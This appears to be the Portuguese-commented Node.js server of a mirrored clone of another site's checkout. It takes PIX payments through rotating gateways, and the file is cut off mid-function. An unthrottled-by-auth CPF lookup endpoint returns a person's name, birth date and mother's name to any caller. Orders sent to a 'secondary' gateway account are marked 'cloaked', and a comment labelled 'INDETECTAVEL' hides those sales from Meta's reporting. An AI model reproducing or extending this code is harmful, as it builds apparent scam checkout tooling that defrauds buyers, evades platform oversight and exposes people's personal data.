'use strict';
/**
 * Valore — servidor do site espelhado (produção).
 *
 * Serve o espelho do site (public/) e implementa a MESMA API que o frontend
 * consome, com os mesmos formatos de requisição e resposta do original:
 *
 *   GET    /api/settings                  -> { activeGatewayId }
 *   PUT    /api/settings                  -> { activeGatewayId }
 *   GET    /api/gateway-fee               -> { fixed, percent }
 *   PUT    /api/gateway-fee               -> { fixed, percent }
 *   GET    /api/products                  -> [ { id, kind, name, gatewayName, price, ... } ]
 *   POST   /api/cpf-lookup   { cpf }      -> { configured, name, birthDate, phone, null, motherName }
 *   POST   /api/visitors                  -> visitante completo
 *   GET    /api/visitors/:id              -> visitante completo
 *   PATCH  /api/visitors/:id              -> visitante completo
 *   POST   /api/orders       { visitorId, productId, bumpIds, pushNotificationId }
 *                                         -> { configured, order: { id, status, amount, totalPrice, qrCodeText, qrCodeBase64 } }
 *   GET    /api/orders/:id                -> { id, status, paidAt }   status: PENDING | COMPLETED
 *   POST   /api/webhooks/bspay            webhook cashin.confirmed / cashin.expired / cashin.refunded
 *   GET    /api/health[?deep=1]           operacional
 *   GET    /api/admin/stats               operacional (protegido por ADMIN_TOKEN em produção)
 *   POST   /api/orders/:id/simulate-paid  SOMENTE fora de produção e com ALLOW_MOCK_PIX=1
 *
 * Zero dependências: Node >= 18.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');

const config = require('./lib/config');
const store = require('./lib/store');
const cpf = require('./lib/cpf');
const cep = require('./lib/cep');
const products = require('./lib/products');
const bspay = require('./lib/bspay');
const pix = require('./lib/pix');
const qrimg = require('./lib/qrimg');
const metaCapi = require('./lib/meta-capi');
const quantumpay = require('./lib/quantumpay');
const nitropay = require('./lib/nitropay');
const pushService = require('./lib/push');
const recovery = require('./lib/recovery');
const pushAdmin = require('./lib/push-admin');
const utmify = require('./lib/utmify');

let isRunningAutoRecovery = false;
let lastAutoRecoveryRun = 0;
function triggerAutoRecoveryThrottled() {
  const now = Date.now();
  if (isRunningAutoRecovery || (now - lastAutoRecoveryRun < 15000)) return;
  lastAutoRecoveryRun = now;
  isRunningAutoRecovery = true;
  Promise.resolve().then(async () => {
    try {
      await recovery.processAutomatedRecovery();
    } catch (e) {
      console.warn('[recovery-auto] Falha ao processar recuperação:', e.message);
    } finally {
      isRunningAutoRecovery = false;
    }
  });
}

const PUBLIC_DIR = path.join(__dirname, 'public');
const ORDER_LOG = path.join(config.dataDir, 'orders.jsonl');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.gif': 'image/gif',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.txt': 'text/plain; charset=utf-8',
  '.webmanifest': 'application/manifest+json',
  '.map': 'application/json; charset=utf-8',
};

/* --------------------------------- helpers -------------------------------- */

function baseHeaders(req) {
  const h = {
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
  };
  const origin = req?.headers?.origin;
  if (config.corsOrigins.length) {
    /* Lista explícita: libera só os domínios configurados. */
    if (origin && config.corsOrigins.includes(origin)) {
      h['Access-Control-Allow-Origin'] = origin;
      h['Vary'] = 'Origin';
    }
  } else if (!config.isProd && origin) {
    /* Desenvolvimento: qualquer origem, para facilitar testes. */
    h['Access-Control-Allow-Origin'] = origin;
  }
  return h;
}

function sendJson(req, res, status, payload) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    ...baseHeaders(req),
  });
  res.end(body);
}

/** A API original responde erro como {"error":"mensagem"}. */
const fail = (req, res, status, message) => sendJson(req, res, status, { error: message });

async function readRaw(req, limit = 512 * 1024) {
  const chunks = [];
  let size = 0;
  for await (const c of req) {
    size += c.length;
    if (size > limit) {
      const e = new Error('Payload muito grande');
      e.status = 413;
      throw e;
    }
    chunks.push(c);
  }
  return Buffer.concat(chunks);
}

async function readJson(req) {
  const raw = await readRaw(req);
  if (!raw.length) return {};
  try {
    return JSON.parse(raw.toString('utf8'));
  } catch {
    const e = new Error('JSON inválido');
    e.status = 400;
    throw e;
  }
}

function clientIp(req) {
  if (config.trustProxy) {
    const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
    if (fwd) return fwd;
    const real = req.headers['cf-connecting-ip'];
    if (real) return String(real);
  }
  return (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
}

/* --------------------------- limite de requisições ------------------------- */
const buckets = new Map();

function rateLimited(key, perMinute) {
  if (!perMinute || perMinute <= 0) return false;
  const now = Date.now();
  const b = buckets.get(key) || { count: 0, resetAt: now + 60000 };
  if (now > b.resetAt) { b.count = 0; b.resetAt = now + 60000; }
  b.count++;
  buckets.set(key, b);
  if (buckets.size > 5000) { // faxina simples
    for (const [k, v] of buckets) if (now > v.resetAt) buckets.delete(k);
  }
  return b.count > perMinute;
}

/* ------------------------------- auditoria -------------------------------- */

function logOrder(event, order, extra = {}) {
  /* Eventos de dinheiro são gravados em disco na hora: o store não pode viver
     só em memória por causa do debounce de 150 ms. */
  if (/created|charged|completed|failed|refunded|expired/.test(event)) store.flushNow();
  try {
    fs.mkdirSync(config.dataDir, { recursive: true });
    fs.appendFileSync(ORDER_LOG, `${JSON.stringify({
      at: new Date().toISOString(),
      event,
      orderId: order?.id,
      externalId: order?.externalId,
      transactionId: order?.transactionId || null,
      status: order?.status,
      amount: order?.amount,
      provider: order?.provider,
      visitorId: order?.visitorId,
      ...extra,
    })}\n`);
  } catch (e) {
    console.warn('[audit] falha ao gravar log:', e.message);
  }

  /* Disparo server-side de Purchase via Meta Conversions API (CAPI) */
  if (event === 'completed' && order) {
    if (order.gatewayAccount === 'secondary' || order.isCloaked || order.channel === 'cloaked') {
      return; // INDETECTAVEL: Suprime CAPI para a conta secundária
    }
    try {
      const visitor = order.visitorId ? store.getVisitor(order.visitorId) : null;
      const combinedUser = {
        ...(visitor || {}),
        ...(order.customer || {}),
        ...(extra?.payer || {}),
      };
      metaCapi.sendPurchase(order, combinedUser, { userData: extra?.payer || {} }).catch((e) => {
        console.warn('[meta-capi] falha ao enviar purchase:', e.message);
      });
    } catch (e) {
      console.warn('[meta-capi] erro:', e.message);
    }
  }
}

const publicOrder = (o) => ({
  id: o.id,
  status: o.status,
  amount: o.amount,
  totalPrice: o.totalPrice ?? o.amount,
  qrCodeText: o.qrCodeText || '',
  qrCodeBase64: o.qrCodeBase64 || '',
  channel: o.channel || (o.gatewayAccount === 'secondary' || o.isCloaked ? 'cloaked' : 'standard'),
  isCloaked: !!(o.isCloaked || o.gatewayAccount === 'secondary'),
});

/** Postback derivado do host da requisição quando não há URL configurada. */
function postbackFromRequest(req) {
  if (bspay.pickPostbackUrl()) return null; // já existe uma URL válida no .env
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  if (!host || /^(localhost|127\.0\.0\.1)/i.test(host)) return null;
  const proto = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim() || 'https';
  return `${proto}://${host}/api/webhooks/bspay`;
}

/* ------------------------ sincronização contínua com Meta CAPI ------------- */
const KNOWN_SYNCED = [
  'valore-mvcktcx2wxs81ffv',
  'valore-mvcknzlsbc9e1fp2',
  'valore-mvcknq0qj5t256x3',
  'valore-mvbi3f9e189zfggq',
  'valore-mvb26b1xf3zcrm87',
  'valore-mva6l2ghqegha68r',
  'valore-mva2vhr4n61d7wtl',
  'valore-mva291pacv6cxk6d',
  'valore-mva0bn4yk94oz4wl',
  'valore-mv8r1rjza4ruvb6i',
];

const SYNCED_FILE = path.join(config.dataDir, 'synced-purchases.json');
let syncedSet = null;

function getSyncedSet() {
  if (syncedSet) return syncedSet;
  syncedSet = new Set(KNOWN_SYNCED);
  try {
    if (fs.existsSync(SYNCED_FILE)) {
      const arr = JSON.parse(fs.readFileSync(SYNCED_FILE, 'utf8'));
      if (Array.isArray(arr)) arr.forEach((id) => syncedSet.add(id));
    }
  } catch {}
  return syncedSet;
}

function markSynced(id) {
  const set = getSyncedSet();
  set.add(id);
  try {
    fs.mkdirSync(config.dataDir, { recursive: true });
    fs.writeFileSync(SYNCED_FILE, JSON.stringify([...set]));
  } catch {}
}

let lastSyncAt = 0;
async function syncRecentConfirmedOrders() {
  const now = Date.now();
  if (now - lastSyncAt < 20000) return; // max 1 verificação a cada 20s
  lastSyncAt = now;

  try {
    const list = await bspay.listTransactions({ page: 1, pageSize: 20, source: 'cashin', status: 'confirmed' });
    const items = Array.isArray(list) ? list : (list?.items || []);
    const synced = getSyncedSet();

    for (const tx of items) {
      const extId = tx.external_id;
      if (!extId || synced.has(extId)) continue;

      markSynced(extId);

      const order = store.getOrder(extId) || store.createOrder({
        id: extId,
        externalId: extId,
        transactionId: tx.transaction_id || null,
        status: 'COMPLETED',
        amount: Number(tx.amount || 0),
        totalPrice: Number(tx.amount || 0),
        provider: 'bspay',
        paidAt: tx.confirmed_at || new Date().toISOString(),
        customer: {
          name: tx.payer?.name || tx.generated?.name || '',
          document: tx.payer?.document || tx.generated?.document || '',
          email: tx.generated?.email || '',
        },
      });

      logOrder('completed', order, {
        source: 'bspay-sync',
        payer: tx.payer || tx.generated,
      });
      console.log(`[auto-sync] Nova venda sincronizada com Meta CAPI: ${extId} (R$ ${tx.amount})`);
    }
  } catch (e) {
    console.warn('[auto-sync] falha:', e.message);
  }
}

/* ----------------------------------- API ---------------------------------- */

async function handleApi(req, res, url) {
  const { pathname, searchParams } = url;
  const method = req.method.toUpperCase();
  const ip = clientIp(req);

  // Executa sync de vendas em background com gateway de forma não-bloqueante
  syncRecentConfirmedOrders().catch(() => {});

  if (method === 'OPTIONS') {
    res.writeHead(204, {
      ...baseHeaders(req),
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Allow-Methods': 'GET,POST,PUT,PATCH,DELETE,OPTIONS',
      'Access-Control-Max-Age': '600',
    });
    return res.end();
  }

  /* ------------------------------- operacional ------------------------------ */
  if (pathname === '/api/health') {
    const deep = searchParams.get('deep') === '1';
    const out = {
      status: 'ok',
      brand: config.brand.name,
      env: config.nodeEnv,
      bspayConfigured: config.bspay.configured,
      quantumpayConfigured: config.quantumpay.configured,
      quantumpayEnabled: config.quantumpay.enabled,
      nitropayConfigured: config.nitropay.configured,
      nitropayEnabled: config.nitropay.enabled,
      pushConfigured: config.push.configured,
      pushSubscriptionsCount: pushService.getSubscriptions().length,
      cpfApiConfigured: config.cpf.configured,
      mockPix: config.allowMockPix,
      webhookSecured: config.bspay.webhookSecured,
      sandbox: config.bspay.sandbox,
      uptime: Math.round(process.uptime()),
    };
    if (deep && config.bspay.configured) {
      try {
        const t0 = Date.now();
        await bspay.balance();
        out.bspay = { ok: true, latencyMs: Date.now() - t0 };
      } catch (e) {
        out.bspay = { ok: false, code: e.code || null, message: e.message };
        out.status = 'degraded';
      }
    }
    return sendJson(req, res, 200, out);
  }

  if (pathname === '/api/sync') {
    lastSyncAt = 0; // força execução imediata
    await syncRecentConfirmedOrders();
    return sendJson(req, res, 200, {
      status: 'ok',
      syncedCount: getSyncedSet().size,
      synced: [...getSyncedSet()],
    });
  }

  if (pathname === '/api/admin/stats') {
    const token = process.env.ADMIN_TOKEN;
    if (config.isProd) {
      if (!token) return fail(req, res, 404, 'Rota não encontrada');
      if ((req.headers.authorization || '') !== `Bearer ${token}`) {
        return fail(req, res, 401, 'Não autorizado');
      }
    }
    return sendJson(req, res, 200, {
      ...store.stats(),
      bspay: { configured: config.bspay.configured, base: config.bspay.apiBase, sandbox: config.bspay.sandbox },
      pix: { provider: config.bspay.configured ? 'bspay' : 'mock' },
    });
  }

  /* --------------------------------- settings ------------------------------- */
  if (pathname === '/api/settings') {
    if (method === 'GET') return sendJson(req, res, 200, store.getSettings());
    if (method === 'PUT' || method === 'POST') {
      if (config.isProd) return fail(req, res, 403, 'Alteração desabilitada em produção');
      const body = await readJson(req);
      return sendJson(req, res, 200, store.setSettings({ activeGatewayId: String(body.activeGatewayId || config.bspay.activeGatewayId) }));
    }
  }

  /* ------------------------------- taxa gateway ----------------------------- */
  if (pathname === '/api/gateway-fee') {
    if (method === 'GET') return sendJson(req, res, 200, store.getGatewayFee());
    if (method === 'PUT' || method === 'POST') {
      if (config.isProd) return fail(req, res, 403, 'Alteração desabilitada em produção');
      const body = await readJson(req);
      return sendJson(req, res, 200, store.setGatewayFee(body));
    }
  }

  /* --------------------------------- produtos ------------------------------- */
  if (pathname === '/api/products' && method === 'GET') {
    return sendJson(req, res, 200, products.all());
  }

  /* ------------------------------ consulta de CPF --------------------------- */
  if (pathname === '/api/cpf-lookup' && method === 'POST') {
    if (rateLimited(`cpf:${ip}`, config.rateLimit.cpfPerMin)) {
      return fail(req, res, 429, 'Muitas consultas. Aguarde um instante.');
    }
    const body = await readJson(req);
    if (!config.cpf.configured) {
      return sendJson(req, res, 200, {
        configured: false,
        name: null,
        birthDate: null,
        phone: null,
        motherName: null,
        gender: '',
      });
    }
    try {
      const person = await cpf.lookup(body.cpf);
      const genderMap = { M: 'masculino', F: 'feminino' };
      return sendJson(req, res, 200, {
        configured: config.cpf.configured,
        name: person.nome,
        birthDate: person.nascimento,
        /* O campo "Celular (WhatsApp)" usa este valor: sempre null para o
           cliente digitar o próprio número em vez de vir da consulta. */
        phone: null,
        motherName: person.nomeMae,
        gender: genderMap[person.genero] || '',
      });
    } catch (e) {
      if (e.code === 'INVALID_CPF') {
        return fail(req, res, 422, e.message);
      }
      return sendJson(req, res, 200, {
        configured: false,
        name: null,
        birthDate: null,
        phone: null,
        motherName: null,
        gender: '',
      });
    }
  }

  /* -------------------------------- visitantes ------------------------------ */
  if (pathname === '/api/visitors' && method === 'POST') {
    const body = await readJson(req);
    const utm = Object.fromEntries([...searchParams].filter(([k]) => k.startsWith('utm_')));
    return sendJson(req, res, 200, store.createVisitor(body, {
      ip,
      userAgent: req.headers['user-agent'] || '',
      utm,
    }));
  }

  const visitorMatch = pathname.match(/^\/api\/visitors\/([\w-]{4,64})$/);
  if (visitorMatch) {
    const id = visitorMatch[1];
    if (method === 'GET') {
      const v = store.getVisitor(id);
      if (!v) return fail(req, res, 404, 'Visitante não encontrado');
      return sendJson(req, res, 200, v);
    }
    if (method === 'PATCH' || method === 'PUT') {
      const body = await readJson(req);
      if (!store.getVisitor(id)) return fail(req, res, 404, 'Visitante não encontrado');
      const updated = store.updateVisitor(id, body);
      triggerAutoRecoveryThrottled();
      return sendJson(req, res, 200, updated);
    }
  }

  /* ------------------------------ criação de PIX ---------------------------- */
  if (pathname === '/api/orders' && method === 'POST') {
    if (rateLimited(`orders:${ip}`, config.rateLimit.ordersPerMin)) {
      return fail(req, res, 429, 'Muitas solicitações. Aguarde um instante.');
    }

    const body = await readJson(req);
    const visitorId = body.visitorId || null;
    const items = products.resolveItems(body.productId || 'seguro-plus', body.bumpIds || []);
    if (!items.length) return fail(req, res, 400, 'Dados inválidos');

    const amount = products.totalOf(items);
    const visitor = visitorId ? store.getVisitor(visitorId) : null;
    const clientCustomer = (body && typeof body.customer === 'object') ? body.customer : {};

    let customerName = String(clientCustomer.name || visitor?.name || '').trim();
    let customerDoc = String(clientCustomer.document || clientCustomer.cpf || visitor?.cpf || '').replace(/\D/g, '');
    let customerEmail = String(clientCustomer.email || visitor?.email || '').trim();
    let customerPhone = String(clientCustomer.phone || clientCustomer.celular || visitor?.phone || '').replace(/\D/g, '');

    if (!customerName && customerDoc && customerDoc.length === 11 && config.cpf.configured) {
      try {
        const person = await cpf.lookup(customerDoc);
        if (person && person.nome) {
          customerName = person.nome;
        }
      } catch (e) {
        /* fallback silencioso */
      }
    }

    if (visitorId && visitor) {
      store.updateVisitor(visitorId, {
        ...(customerName ? { name: customerName } : {}),
        ...(customerDoc ? { cpf: customerDoc } : {}),
        ...(customerEmail ? { email: customerEmail } : {}),
        ...(customerPhone ? { phone: customerPhone } : {}),
      });
    }

    const chosenGateway = store.getNextGateway();
    let usedGateway = chosenGateway;
    let nitroAccount = 'primary';
    let isCloaked = false;
    let channel = 'standard';

    if (usedGateway === 'nitropay') {
      nitroAccount = store.getNextNitroAccount();
      isCloaked = (nitroAccount === 'secondary');
      channel = isCloaked ? 'cloaked' : 'standard';
    }

    const order = store.createOrder({
      visitorId,
      items,
      amount,
      totalPrice: amount,
      externalId: makeExternalId(),
      provider: 'pending',
      channel,
      gatewayAccount: nitroAccount,
      isCloaked,
      pushNotificationId: body.pushNotificationId || null,
      customer: {
        name: customerName,
        document: customerDoc,
        email: customerEmail,
        phone: customerPhone,
      },
      ip,
    });
    logOrder('created', order);

    let charge;
    if (usedGateway === 'quantumpay') {
      try {
        charge = await quantumpay.createPixCharge({
          amount,
          externalId: order.externalId,
          description: items.map((i) => i.name).join(' + '),
          postbackUrl: postbackFromRequest(req),
          payer: {
            name: order.customer.name,
            document: order.customer.document,
            email: order.customer.email,
            phone: order.customer.phone,
          },
        });
      } catch (e) {
        console.warn(`[pix] QuantumPay falhou (${e.message}). Fazendo fallback para BSPay.`);
        usedGateway = 'bspay';
        channel = 'standard';
        isCloaked = false;
        nitroAccount = 'primary';
      }
    }

    if (usedGateway === 'nitropay') {
      try {
        charge = await nitropay.createPixCharge({
          amount,
          externalId: order.externalId,
          description: items.map((i) => i.name).join(' + '),
          account: nitroAccount,
          payer: {
            name: order.customer.name,
            document: order.customer.document,
            email: order.customer.email,
            phone: order.customer.phone,
          },
        });
      } catch (e) {
        console.warn(`[pix] NitroPay (${nitroAccount}) falhou (${e.message}). Fazendo fallback para BSPay.`);
        usedGateway = 'bspay';
        channel = 'standard';
        isCloaked = false;
        nitroAccount = 'primary';
      }
    }

    if (usedGateway === 'bspay') {
      try {
        charge = await bspay.createPixCharge({
          amount,
          externalId: order.externalId,
          description: items.map((i) => i.name).join(' + '),
          postbackUrl: postbackFromRequest(req),
          payer: {
            name: order.customer.name,
            document: order.customer.document,
            email: order.customer.email,
          },
        });
      } catch (e) {
        if (!config.allowMockPix) {
          store.updateOrder(order.id, { status: 'FAILED', gatewayError: { code: e.code, message: e.message } });
          logOrder('failed', store.getOrder(order.id), { code: e.code, message: e.message });
          console.error(`[pix] falha ao criar cobrança na BSPay (${e.code}): ${e.message}`);
          return fail(req, res, e.status || 502, 'Não foi possível gerar o PIX agora. Tente novamente.');
        }

        /* Modo local (nunca em produção sem ALLOW_MOCK_PIX=1). */
        const code = pix.buildPixPayload({
          key: config.pix.key,
          amount,
          merchant: config.brand.name,
          city: 'SAO PAULO',
          txid: order.id.replace(/\W/g, '').toUpperCase(),
          description: items[0]?.name,
        });
        console.warn(`[pix] Gateways indisponíveis; ordem ${order.id} gerada em modo local`);
        store.updateOrder(order.id, {
          provider: 'mock',
          channel: 'standard',
          status: 'PENDING',
          qrCodeText: code,
          qrCodeBase64: qrimg.toBase64(code),
          gatewayError: { code: e.code || 'GATEWAY_ERROR', message: e.message },
        });
        logOrder('created-mock', store.getOrder(order.id));
        return sendJson(req, res, 200, { configured: true, order: publicOrder(store.getOrder(order.id)) });
      }
    }

    store.updateOrder(order.id, {
      provider: usedGateway,
      channel,
      gatewayAccount: nitroAccount,
      isCloaked,
      status: 'PENDING',
      qrCodeText: charge.qrcode,
      qrCodeBase64: charge.qrCodeBase64 || (charge.qrcode ? qrimg.toBase64(charge.qrcode) : ''),
      transactionId: charge.transactionId,
      fee: charge.fee || null,
      expiresAt: charge.expiresAt || null,
      postbackUrl: charge.postbackUrl || null,
    });
    const freshOrder = store.getOrder(order.id);
    logOrder('charged', freshOrder);
    if (usedGateway === 'quantumpay') {
      utmify.notifyPixGenerated(freshOrder, visitor).catch(() => {});
    }
    triggerAutoRecoveryThrottled();
    return sendJson(req, res, 200, { configured: true, order: publicOrder(freshOrder) });
  }

  /* ------------------------------ status da ordem --------------------------- */
  const orderMatch = pathname.match(/^\/api\/orders\/([\w-]{4,64})$/);
  if (orderMatch && method === 'GET') {
    const orderId = orderMatch[1];
    let order = store.getOrder(orderId);

    /* Fallback para ambientes serverless (Vercel) onde instâncias não compartilham /tmp */
    if (!order && config.bspay.configured) {
      try {
        const tx = await bspay.findTransaction({ externalId: orderId, transactionId: orderId });
        if (tx) {
          const isPaid = bspay.PAID_STATUSES.includes(String(tx.status || '').toLowerCase());
          const paidStatus = isPaid ? 'COMPLETED' : 'PENDING';
          order = store.createOrder({
            id: orderId,
            externalId: tx.external_id || orderId,
            transactionId: tx.transaction_id || null,
            status: paidStatus,
            amount: Number(tx.amount || 0),
            totalPrice: Number(tx.amount || 0),
            provider: 'bspay',
            paidAt: isPaid ? (tx.confirmed_at || new Date().toISOString()) : null,
            customer: {
              name: tx.payer?.name || tx.generated?.name || '',
              document: tx.payer?.document || tx.generated?.document || '',
              email: tx.generated?.email || '',
            },
          });
          if (isPaid) {
            logOrder('completed', order, { source: 'bspay-fallback', payer: tx.payer || tx.generated });
          }
        }
      } catch (e) {
        console.warn('[orders] falha no fallback BSPay:', e.message);
      }
    }

    if (!order && config.nitropay.configured) {
      try {
        const tx = await nitropay.consultTransaction(orderId);
        if (tx && tx.id && tx.status && tx.name !== 'Nitro Pagamentos HUB API') {
          const statusStr = String(tx.status || '').toLowerCase();
          const isPaid = ['pago', 'paid', 'approved', 'confirmado'].includes(statusStr);
          const paidStatus = isPaid ? 'COMPLETED' : 'PENDING';
          order = store.createOrder({
            id: orderId,
            externalId: tx.external_ref || tx.metadata?.order_id || orderId,
            transactionId: tx.id || orderId,
            status: paidStatus,
            amount: Number(tx.amount || 0),
            totalPrice: Number(tx.amount || 0),
            provider: 'nitropay',
            channel: 'direct',
            paidAt: isPaid ? (tx.paid_at || new Date().toISOString()) : null,
            customer: {
              name: tx.customer?.name || '',
              document: tx.customer?.document || '',
              email: tx.customer?.email || '',
              phone: tx.customer?.phone || '',
            },
          });
          if (isPaid) {
            logOrder('completed', order, { source: 'nitropay-fallback', payer: tx.customer });
          }
        }
      } catch (e) {
        // não é transação da NitroPay
      }
    }

    if (!order) return fail(req, res, 404, 'Ordem não encontrada');

    store.expireStale();
    let fresh = store.getOrder(order.id) || order;

    /* Reconciliação: pendente + BSPay configurada */
    const ageMs = Date.now() - new Date(fresh.createdAt || Date.now()).getTime();
    if (
      fresh.status === 'PENDING'
      && fresh.provider === 'bspay'
      && config.bspay.configured
      && (ageMs > 8000 || !fresh.createdAt)
      && Date.now() - (fresh.lastReconcileAt || 0) > 4000
    ) {
      store.updateOrder(fresh.id, { lastReconcileAt: Date.now() });
      try {
        const check = await bspay.isChargePaid({ externalId: fresh.externalId, transactionId: fresh.transactionId });
        if (check.paid) {
          store.completeOrder(fresh.id, 'reconcile', { status: check.status });
          fresh = store.getOrder(fresh.id) || fresh;
          fresh.status = 'COMPLETED';
          fresh.paidAt = fresh.paidAt || check.tx?.confirmed_at || new Date().toISOString();
          logOrder('completed', fresh, { source: 'reconcile', payer: check.tx?.payer || check.tx?.generated });
        }
      } catch (e) {
        console.warn('[reconcile] falha:', e.message);
      }
      fresh = store.getOrder(order.id) || fresh;
    }

    /* Reconciliação: pendente + NitroPay configurada */
    if (
      fresh.status === 'PENDING'
      && fresh.provider === 'nitropay'
      && config.nitropay.configured
      && (fresh.transactionId || fresh.id)
      && (ageMs > 3000 || !fresh.createdAt)
      && Date.now() - (fresh.lastReconcileAt || 0) > 3000
    ) {
      store.updateOrder(fresh.id, { lastReconcileAt: Date.now() });
      try {
        const check = await nitropay.isChargePaid({
          transactionId: fresh.transactionId || fresh.id,
          account: fresh.gatewayAccount || 'primary',
        });
        if (check.paid) {
          store.completeOrder(fresh.id, 'nitropay-reconcile', { status: check.status });
          fresh = store.getOrder(fresh.id) || fresh;
          fresh.status = 'COMPLETED';
          fresh.paidAt = fresh.paidAt || check.tx?.paid_at || new Date().toISOString();
          logOrder('completed', fresh, { source: 'nitropay-reconcile', payer: check.tx?.customer });
        }
      } catch (e) {
        console.warn('[nitropay-reconcile] falha:', e.message);
      }
      fresh = store.getOrder(order.id) || fresh;
    }

    /* Reconciliação: pendente + QuantumPay configurada */
    if (
      fresh.status === 'PENDING'
      && fresh.provider === 'quantumpay'
      && config.quantumpay.configured
      && (fresh.transactionId || fresh.id)
      && (ageMs > 3000 || !fresh.createdAt)
      && Date.now() - (fresh.lastReconcileAt || 0) > 3000
    ) {
      store.updateOrder(fresh.id, { lastReconcileAt: Date.now() });
      try {
        const check = await quantumpay.isChargePaid({
          transactionId: fresh.transactionId || fresh.id,
        });
        if (check.paid) {
          store.completeOrder(fresh.id, 'quantumpay-reconcile', { status: check.status });
          fresh = store.getOrder(fresh.id) || fresh;
          fresh.status = 'COMPLETED';
          fresh.paidAt = fresh.paidAt || check.tx?.paidAt || new Date().toISOString();
          logOrder('completed', fresh, { source: 'quantumpay-reconcile', payer: check.tx?.customer });
          const v = fresh.visitorId ? store.getVisitor(fresh.visitorId) : null;
          utmify.notifyPixPaid(fresh, v).catch(() => {});
        }
      } catch (e) {
        console.warn('[quantumpay-reconcile] falha:', e.message);
      }
      fresh = store.getOrder(order.id) || fresh;
    }

    return sendJson(req, res, 200, {
      id: fresh.id,
      status: fresh.status,
      amount: fresh.amount,
      paidAt: fresh.paidAt,
      channel: fresh.channel || (fresh.isCloaked || fresh.gatewayAccount === 'secondary' ? 'cloaked' : 'standard'),
      isCloaked: !!(fresh.isCloaked || fresh.gatewayAccount === 'secondary'),
    });
  }

  /* ------------------------- simulação de pagamento (dev) -------------------- */
  const paidMatch = pathname.match(/^\/api\/orders\/([\w-]{4,64})\/simulate-paid$/);
  if (paidMatch && method === 'POST') {
    if (config.isProd || !config.allowMockPix) {
      return fail(req, res, 403, 'Simulação desabilitada');
    }
    if (!store.getOrder(paidMatch[1])) return fail(req, res, 404, 'Ordem não encontrada');
    const o = store.completeOrder(paidMatch[1], 'mock', { at: new Date().toISOString() });
    logOrder('completed', o, { source: 'mock' });
    return sendJson(req, res, 200, { id: o.id, status: o.status, paidAt: o.paidAt });
  }

  /* ---------------------------------- webhook ------------------------------- */
  if (pathname === '/api/webhooks/bspay' && method === 'POST') {
    const raw = await readRaw(req);
    const event = String(req.headers['x-webhook-event'] || '');
    const signature = req.headers['x-webhook-signature'];
    const sandbox = req.headers['x-sandbox'] === '1';
    const ts = req.headers['x-webhook-timestamp'];

    let payload = {};
    try { payload = JSON.parse(raw.toString('utf8')); } catch { /* corpo não-JSON */ }

    const data = payload.data || {};
    const txId = payload.transaction_id || data.transaction_id;
    const externalId = data.external_id || payload.external_id;
    let order = (externalId && store.findByExternalId(externalId)) || store.findByTransactionId(txId);

    /* Recupera ordem em ambientes serverless se não estiver em memória */
    if (!order && externalId) {
      order = store.createOrder({
        id: externalId,
        externalId,
        transactionId: txId || null,
        status: 'PENDING',
        amount: Number(data.amount || payload.amount || 0),
        totalPrice: Number(data.amount || payload.amount || 0),
        provider: 'bspay',
        customer: {
          name: data.payer?.name || payload.payer?.name || data.generated?.name || '',
          document: data.payer?.document || payload.payer?.document || data.generated?.document || '',
          email: data.generated?.email || payload.generated?.email || '',
        },
      });
    }

    /* Verificação: assinatura HMAC quando existe segredo; caso contrário,
       o webhook é tratado apenas como aviso e a confirmação é buscada na API. */
    let verified = false;
    if (config.bspay.webhookSecured) {
      if (!bspay.webhookTimestampOk(ts)) {
        console.warn('[webhook] timestamp fora da janela anti-replay:', ts);
        return fail(req, res, 401, 'Assinatura inválida');
      }
      verified = bspay.verifyWebhook(raw, signature);
      if (!verified) {
        console.warn('[webhook] assinatura inválida — evento:', event);
        return fail(req, res, 401, 'Assinatura inválida');
      }
    }

    if (!order) {
      /* Pode ser um webhook de outro sistema/ordem antiga: responde 200 para
         o gateway não ficar reentregando indefinidamente. */
      return sendJson(req, res, 200, { received: true, matched: false, verified });
    }

    if (sandbox) {
      return sendJson(req, res, 200, { received: true, matched: true, sandbox: true, orderId: order.id });
    }

    const confirmed = verified || (config.bspay.webhookSecured ? false : await confirmOnGateway(order, txId));

    if (event === 'cashin.confirmed' && confirmed) {
      store.completeOrder(order.id, verified ? 'webhook' : 'webhook+gateway', payload);
      const updated = store.getOrder(order.id) || order;
      updated.status = 'COMPLETED';
      logOrder('completed', updated, { source: verified ? 'webhook' : 'webhook+gateway', payer: data.payer || data.generated });
    } else if (event === 'cashin.expired') {
      store.updateOrder(order.id, { status: 'EXPIRED' });
    } else if (event === 'cashin.refunded') {
      store.updateOrder(order.id, { status: 'REFUNDED' });
    } else if (event === 'cashin.confirmed') {
      console.warn(`[webhook] confirmação não validada para a ordem ${order.id} — mantida pendente`);
      return sendJson(req, res, 200, { received: true, matched: true, confirmed: false, orderId: order.id });
    }

    return sendJson(req, res, 200, {
      received: true,
      matched: true,
      verified,
      orderId: order.id,
      status: store.getOrder(order.id).status,
    });
  }

  /* ------------------------------ webhook nitropay --------------------------- */
  if (pathname === '/api/webhooks/nitropay' && method === 'POST') {
    const raw = await readRaw(req);
    let payload = {};
    try { payload = JSON.parse(raw.toString('utf8')); } catch { /* corpo não-JSON */ }

    const data = payload.data || payload;
    const txId = data.id || data.transaction_id || payload.id;
    const externalId = data.external_ref || data.external_id || data.metadata?.order_id || payload.external_ref;
    const status = String(data.status || payload.status || '').toLowerCase();
    const event = String(payload.event || '').toLowerCase();

    let order = (externalId && store.findByExternalId(externalId)) || (txId && store.findByTransactionId(txId));

    if (!order && externalId) {
      order = store.createOrder({
        id: externalId,
        externalId,
        transactionId: txId || null,
        status: 'PENDING',
        amount: Number(data.amount || payload.amount || 0),
        totalPrice: Number(data.amount || payload.amount || 0),
